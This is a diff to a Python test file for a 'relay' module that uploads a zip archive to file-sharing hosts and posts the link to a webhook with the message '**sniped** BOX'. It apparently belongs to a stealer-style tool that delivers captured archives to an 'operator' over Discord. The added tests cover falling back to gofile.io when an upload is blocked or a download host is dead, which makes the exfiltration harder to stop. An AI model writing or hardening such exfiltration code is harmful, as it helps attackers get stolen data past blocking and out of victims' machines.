@@ -227,6 +227,7 @@ def test_send_link_uploads_first_and_posts_the_url(
         assert "https://files.example/abc.zip" in document["content"]
         return b""
 
+    monkeypatch.setattr(relay, "_reachable", lambda _: True)
     monkeypatch.setattr(relay, "_post", fake_post)
     monkeypatch.setattr(relay, "_post_json", fake_json)
 
@@ -237,22 +238,86 @@ def test_send_link_uploads_first_and_posts_the_url(
     assert calls[1][1] == "https://hook.example/abc"
 
 
-def test_send_link_refuses_a_host_that_returns_html(
+def test_send_link_falls_back_when_the_host_returns_html(
     monkeypatch: pytest.MonkeyPatch, tmp_path: Path
 ) -> None:
-    # A 200 with an error page is exactly how a blocked upload looks from here.
+    # A 200 with an error page is exactly how a blocked upload looks from here, and the
+    # file still has to reach the operator, so the fallback takes it.
     archive = tmp_path / "sable.zip"
     archive.write_bytes(b"PK\x03\x04")
 
+    posted: list[str] = []
+
+    monkeypatch.setattr(relay, "_reachable", lambda _: True)
     monkeypatch.setattr(relay, "_post", lambda *a, **k: b"<html>blocked</html>")
-    monkeypatch.setattr(relay, "_post_json", lambda *a, **k: b"")
+    monkeypatch.setattr(relay, "_gofile", lambda *a, **k: "https://gofile.io/d/abc")
+    monkeypatch.setattr(
+        relay,
+        "_post_json",
+        lambda _url, document, timeout=0.0: posted.append(document["content"]) or b"",
+    )
 
-    with pytest.raises(relay.RelayError) as caught:
-        relay._send_link("https://hook.example/abc", archive, "**sniped** BOX")
-    assert "no url" in str(caught.value)
+    relay._send_link("https://hook.example/abc", archive, "**sniped** BOX")
+    assert len(posted) == 1
+    assert "https://gofile.io/d/abc" in posted[0]
+    assert "blocked" not in posted[0]
 
 
-def test_send_link_does_not_post_when_the_upload_failed(
+def test_send_link_falls_back_when_the_upload_fails(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    archive = tmp_path / "sable.zip"
+    archive.write_bytes(b"PK\x03\x04")
+
+    posted: list[str] = []
+
+    def fail(*_: object, **__: object) -> bytes:
+        raise relay.RelayError("upload refused")
+
+    monkeypatch.setattr(relay, "_reachable", lambda _: True)
+    monkeypatch.setattr(relay, "_post", fail)
+    monkeypatch.setattr(relay, "_gofile", lambda *a, **k: "https://gofile.io/d/abc")
+    monkeypatch.setattr(
+        relay,
+        "_post_json",
+        lambda _url, document, timeout=0.0: posted.append(document["content"]) or b"",
+    )
+
+    relay._send_link("https://hook.example/abc", archive, "**sniped** BOX")
+    assert len(posted) == 1
+    assert "https://gofile.io/d/abc" in posted[0]
+
+
+def test_send_link_skips_the_upload_when_the_download_host_is_dead(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    # The measured failure: catbox accepted the upload and its download name was reset
+    # at the TLS layer, so a link was posted that nobody could open.
+    archive = tmp_path / "sable.zip"
+    archive.write_bytes(b"PK\x03\x04")
+
+    uploaded: list[int] = []
+    posted: list[str] = []
+
+    monkeypatch.setattr(relay, "_reachable", lambda _: False)
+    monkeypatch.setattr(
+        relay,
+        "_post",
+        lambda *a, **k: uploaded.append(1) or b"https://files.catbox.moe/abc.zip",
+    )
+    monkeypatch.setattr(relay, "_gofile", lambda *a, **k: "https://gofile.io/d/abc")
+    monkeypatch.setattr(
+        relay,
+        "_post_json",
+        lambda _url, document, timeout=0.0: posted.append(document["content"]) or b"",
+    )
+
+    relay._send_link("https://hook.example/abc", archive, "**sniped** BOX")
+    assert uploaded == []
+    assert "https://gofile.io/d/abc" in posted[0]
+
+
+def test_send_link_posts_nothing_when_both_hosts_fail(
     monkeypatch: pytest.MonkeyPatch, tmp_path: Path
 ) -> None:
     archive = tmp_path / "sable.zip"
@@ -263,12 +328,57 @@ def test_send_link_does_not_post_when_the_upload_failed(
     def fail(*_: object, **__: object) -> bytes:
         raise relay.RelayError("upload refused")
 
+    monkeypatch.setattr(relay, "_reachable", lambda _: True)
     monkeypatch.setattr(relay, "_post", fail)
+    monkeypatch.setattr(relay, "_gofile", fail)
     monkeypatch.setattr(relay, "_post_json", lambda *a, **k: posted.append(1) or b"")
 
     with pytest.raises(relay.RelayError):
         relay._send_link("https://hook.example/abc", archive, "**sniped** BOX")
     assert posted == []
+
+
+def test_gofile_reads_the_two_step_answer(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    archive = tmp_path / "sable.zip"
+    payload = b"PK\x03\x04payload"
+    archive.write_bytes(payload)
+
+    seen = capture(
+        monkeypatch,
+        Response(200, b'{"data": {"servers": [{"name": "store1"}]}}'),
+    )
+    urls: list[str] = []
+
+    def fake_post(url: str, body: bytes, boundary: str, timeout: float = 0.0) -> bytes:
+        urls.append(url)
+        assert b"filename=\"sable.zip\"" in body
+        return b'{"data": {"downloadPage": "https://gofile.io/d/abc"}}'
+
+    monkeypatch.setattr(relay, "_post", fake_post)
+    assert relay._gofile(archive, payload) == "https://gofile.io/d/abc"
+    assert urls == ["https://store1.gofile.io/contents/uploadfile"]
+    assert seen[0].full_url == relay._GOFILE_SERVERS
+
+
+def test_a_reachable_check_treats_an_http_error_as_alive(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    # A 403 on the root still proves the name resolves and TLS completes.
+    def refuse(*_: object, **__: object) -> Response:
+        raise urllib.error.HTTPError("https://files.example/", 403, "no", {}, None)
+
+    monkeypatch.setattr(relay.urllib.request, "urlopen", refuse)
+    assert relay._reachable("https://files.example/") is True
+
+
+def test_a_reachable_check_treats_a_reset_as_dead(monkeypatch: pytest.MonkeyPatch) -> None:
+    def reset(*_: object, **__: object) -> Response:
+        raise urllib.error.URLError("remote end closed connection without response")
+
+    monkeypatch.setattr(relay.urllib.request, "urlopen", reset)
+    assert relay._reachable("https://files.example/") is False
 
 
 def test_a_link_message_fits_a_discord_message(tmp_path: Path) -> None:
